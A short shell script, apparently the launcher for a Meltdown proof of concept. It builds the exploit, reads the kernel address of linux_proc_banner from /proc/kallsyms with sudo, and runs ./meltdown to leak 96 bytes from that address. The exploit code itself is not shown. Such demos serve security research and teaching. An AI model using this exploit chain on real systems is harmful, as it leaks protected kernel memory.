#!/bin/sh
make
a=$(sudo cat /proc/kallsyms | grep linux_proc_banner | sed -n -re 's/^([0-9a-f]*[1-9a-f][0-9a-f]*) .* linux_proc_banner$/\1/p')
echo "找到了linux_proc_banner的地址："
echo $a
./meltdown $a 96
rm meltdown
